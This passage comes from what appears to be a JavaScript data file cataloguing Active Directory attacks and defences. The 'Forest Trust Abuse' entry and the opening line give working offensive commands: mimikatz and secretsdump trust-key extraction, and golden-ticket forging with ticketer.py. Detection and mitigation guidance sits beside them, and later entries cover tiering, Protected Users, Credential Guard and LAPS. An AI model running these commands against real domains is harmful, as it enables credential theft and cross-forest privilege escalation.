      "getTGT.py domain.com/FAKE01$:'Password123!' -dc-ip DC_IP"
    ],
    tools: ["Impacket addcomputer", "PowerMad", "StandIn"],
    detection: [
      "Event ID 4741 (computer account created) by non-admin user",
      "Monitor ms-DS-CreatorSID attribute on new computer objects",
      "Alert on computer account creation by standard users",
      "Monitor MachineAccountQuota usage per user"
    ],
    mitre: "T1136.002",
    prevention: [
      "Set ms-DS-MachineAccountQuota to 0",
      "Require domain admin approval for computer account creation",
      "Monitor and alert on computer account creation events",
      "Regular audit of computer accounts and their creators"
    ],
    references: ["https://attack.mitre.org/techniques/T1136/002/"]
  },

  // ===== TRUST ATTACKS =====
  {
    name: "Forest Trust Abuse",
    category: "Trust Attacks",
    description: "Abuse trust relationships between AD forests to escalate from one forest to another. Includes SID history injection across trusts, trust key extraction, and exploiting SID filtering gaps.",
    prerequisites: ["Domain Admin in one forest", "Trust relationship with target forest"],
    commands: [
      "# Enumerate trusts:",
      "Get-DomainTrust",
      "Get-ForestTrust",
      "nltest /domain_trusts /all_trusts",
      "",
      "# Extract trust keys:",
      "mimikatz.exe 'lsadump::trust /patch'",
      "secretsdump.py domain.com/admin:pass@DC_IP -just-dc-user 'TRUSTED_DOMAIN$'",
      "",
      "# Forge inter-realm TGT:",
      "mimikatz.exe 'kerberos::golden /user:admin /domain:child.domain.com /sid:S-1-5-21-child /sids:S-1-5-21-parent-519 /krbtgt:HASH /ptt'",
      "ticketer.py -nthash TRUST_KEY -domain-sid S-1-5-21-child -domain child.domain.com -extra-sid S-1-5-21-parent-519 admin",
      "",
      "# Check SID filtering:",
      "netdom trust child.domain.com /domain:parent.domain.com /quarantine"
    ],
    tools: ["Mimikatz", "Impacket", "PowerView", "netdom", "nltest"],
    detection: [
      "Event ID 4769 with inter-realm TGT from unexpected sources",
      "Event ID 4768 cross-domain authentication anomalies",
      "Monitor for SID history containing Enterprise Admins SID from external forest",
      "Defender for Identity — cross-forest lateral movement detection"
    ],
    mitre: "T1482, T1134.005",
    prevention: [
      "Enable SID Filtering on all trusts (quarantine mode)",
      "Enable Selective Authentication on external trusts",
      "Minimize trust relationships",
      "Use forest trust instead of external trust where possible",
      "Regular trust relationship auditing",
      "Monitor inter-realm TGT requests"
    ],
    references: ["https://attack.mitre.org/techniques/T1482/"]
  },

  // ===== DEFENSE =====
  {
    name: "Tiered Administration Model",
    category: "Defense",
    description: "Implement a three-tier administrative model to contain credential exposure. Tier 0 (identity/DC), Tier 1 (servers), Tier 2 (workstations). Credentials from a higher tier never touch a lower tier, preventing credential theft escalation.",
    prerequisites: ["Organizational commitment", "GPO infrastructure"],
    commands: [
      "# Create tier OUs:",
      "New-ADOrganizationalUnit -Name 'Tier 0' -Path 'DC=domain,DC=com'",
      "New-ADOrganizationalUnit -Name 'Tier 1' -Path 'DC=domain,DC=com'",
      "New-ADOrganizationalUnit -Name 'Tier 2' -Path 'DC=domain,DC=com'",
      "",
      "# GPO: Restrict Tier 0 logon to Tier 0 systems only:",
      "# Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment:",
      "# 'Deny log on locally' — add Tier 0 admin groups to Tier 1/2 GPOs",
      "# 'Deny log on through Remote Desktop' — add Tier 0 admin groups to Tier 1/2 GPOs",
      "# 'Deny access to this computer from the network' — add Tier 0 admin groups to Tier 1/2 GPOs",
      "",
      "# Authentication policy silos (2012 R2+):",
      "New-ADAuthenticationPolicySilo -Name 'Tier0Silo' -UserAllowedToAuthenticateFrom 'O:SYG:SYD:(XA;OICI;CR;;;WD;(@USER.ad://ext/AuthenticationSilo == \"Tier0Silo\"))'",
      "Grant-ADAuthenticationPolicySiloAccess -Identity 'Tier0Silo' -Account 'tier0admin'"
    ],
    tools: ["Group Policy", "Authentication Policy Silos", "Defender for Identity"],
    detection: [
      "Monitor for tier violation — Tier 0 credentials used on Tier 1/2 systems",
      "Event ID 4625 with Tier 0 accounts on non-Tier 0 systems",
      "Authentication policy silo enforcement audit events"
    ],
    mitre: "Mitigation",
    prevention: [
      "This IS the prevention — implement and enforce the tier model",
      "Use PAWs (Privileged Access Workstations) for Tier 0 administration",
      "Deploy jump servers for cross-tier access",
      "Enable Credential Guard on all PAWs",
      "Use just-in-time (JIT) admin access"
    ],
    references: ["https://docs.microsoft.com/en-us/security/compass/privileged-access-access-model"]
  },
  {
    name: "Protected Users Group",
    category: "Defense",
    description: "Security group that enforces strict credential protection. Members cannot use NTLM, DES, or RC4 for authentication. No delegation allowed. TGT lifetime reduced to 4 hours. Credentials not cached. Prevents PtH, Kerberoasting (RC4), and delegation abuse.",
    prerequisites: ["Windows Server 2012 R2+ functional level"],
    commands: [
      "# Add user to Protected Users:",
      "Add-ADGroupMember -Identity 'Protected Users' -Members admin1,admin2",
      "net group 'Protected Users' admin1 /add /domain",
      "",
      "# Check membership:",
      "Get-ADGroupMember -Identity 'Protected Users'",
      "",
      "# Restrictions applied to members:",
      "# - Cannot authenticate with NTLM (only Kerberos)",
      "# - Cannot use DES or RC4 encryption types",
      "# - Cannot be delegated (constrained or unconstrained)",
      "# - TGT lifetime = 4 hours (non-renewable)",
      "# - Credentials not cached on the system",
      "# - WDigest plaintext credential caching disabled",
      "",
      "# Verify restrictions:",
      "Get-ADUser admin1 -Properties ProtectedFromAccidentalDeletion,PrimaryGroupID | Select *"
    ],
    tools: ["Active Directory Users and Computers", "PowerShell AD module"],
    detection: [
      "Event ID 4768 with Protected Users restrictions applied",
      "Event ID 4771 with failure code showing NTLM blocked",
      "Monitor Protected Users group membership changes"
    ],
    mitre: "Mitigation",
    prevention: [
      "Add all Tier 0 admin accounts to Protected Users",
      "Test thoroughly before adding service accounts (NTLM restriction may break legacy apps)",
      "Do NOT add computer accounts (causes authentication issues)",
      "Combine with Credential Guard for maximum protection"
    ],
    references: ["https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group"]
  },
  {
    name: "Windows Defender Credential Guard",
    category: "Defense",
    description: "Uses virtualization-based security (VBS) to isolate LSASS secrets in a protected container. Prevents extraction of NTLM hashes, Kerberos TGTs, and cached credentials by tools like Mimikatz, even with SYSTEM access.",
    prerequisites: ["Windows 10 Enterprise/Education or Server 2016+", "UEFI firmware with Secure Boot", "TPM 2.0 recommended", "Hyper-V enabled"],
    commands: [
      "# Enable via GPO:",
      "# Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security",
      "# Set to 'Enabled with UEFI lock'",
      "# Credential Guard: 'Enabled with UEFI lock'",
      "",
      "# Enable via registry:",
      "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v LsaCfgFlags /t REG_DWORD /d 1 /f",
      "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard' /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f",
      "",
      "# Verify status:",
      "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\\Microsoft\\Windows\\DeviceGuard' | Select *",
      "msinfo32.exe  # Check 'Credential Guard' status",
      "",
      "# Protected by Credential Guard:",
      "# - NTLM password hashes (prevents PtH)",
      "# - Kerberos TGTs (prevents PtT and Golden Ticket use)",
      "# - Cached domain credentials",
      "# - Derived credentials",
      "",
      "# NOT protected by Credential Guard:",
      "# - Local SAM hashes",
      "# - Service account credentials (if using NTLM)",
      "# - Kerberoasting (targets service tickets, not LSASS)"
    ],
    tools: ["Group Policy", "Windows Defender Credential Guard"],
    detection: [
      "System event logs showing Credential Guard initialization",
      "Monitor for attempts to access LSASS (Sysmon Event ID 10)",
      "Detect downgrade to non-VBS protected LSASS"
    ],
    mitre: "Mitigation",
    prevention: [
      "Enable Credential Guard on all workstations and servers",
      "Use UEFI lock to prevent remote disablement",
      "Combine with RunAsPPL for defense in depth",
      "Test compatibility with legacy applications first"
    ],
    references: ["https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/"]
  },
  {
    name: "LAPS (Local Administrator Password Solution)",
    category: "Defense",
    description: "Automatically manages and rotates local administrator passwords on domain-joined computers. Each computer gets a unique, random password stored in AD. Eliminates password reuse across machines, defeating lateral movement via shared local admin passwords.",
    prerequisites: ["Windows Server 2016+ DC (Windows LAPS) or legacy LAPS GPO extension"],
    commands: [
      "# Windows LAPS (built-in, Server 2019+):",
      "# Enable via GPO: Computer Configuration > Administrative Templates > LAPS",
      "Update-LapsADSchema",
      "Set-LapsADComputerSelfPermission -Identity 'Workstations OU'",
      "Set-LapsADReadPasswordPermission -Identity 'Workstations OU' -AllowedPrincipals 'Helpdesk Group'",
      "Get-LapsADPassword -Identity 'WORKSTATION01' -AsPlainText",
      "",
      "# Legacy LAPS:",
      "Import-Module AdmPwd.PS",
      "Update-AdmPwdADSchema",
      "Set-AdmPwdComputerSelfPermission -OrgUnit 'Workstations OU'",
      "Set-AdmPwdReadPasswordPermission -OrgUnit 'Workstations OU' -AllowedPrincipals 'Helpdesk Group'",
      "Get-AdmPwdPassword -ComputerName WORKSTATION01",
      "",
      "# Windows LAPS with encryption (recommended):",
      "# GPO: Configure password backup directory > Active Directory",
      "# GPO: Enable password encryption > Enabled",
      "# GPO: Configure authorized password decryptors > 'LAPS Admins' group"
    ],
    tools: ["Windows LAPS", "Legacy LAPS (AdmPwd.PS)", "LAPS UI"],
    detection: [
      "Monitor LAPS password read events (Event ID 4662 on ms-Mcs-AdmPwd)",
      "Alert on LAPS password reads from unauthorized accounts",
      "Monitor LAPS deployment coverage (computers without LAPS)"
    ],
    mitre: "Mitigation",
    prevention: [
      "Deploy LAPS to all domain-joined computers",
      "Use Windows LAPS with password encryption",
      "Restrict LAPS password read permissions",
      "Monitor LAPS password access events",
      "Set appropriate password rotation interval (30 days recommended)"
    ],
    references: ["https://docs.microsoft.com/en-us/windows-server/identity/laps/"]
  }
];
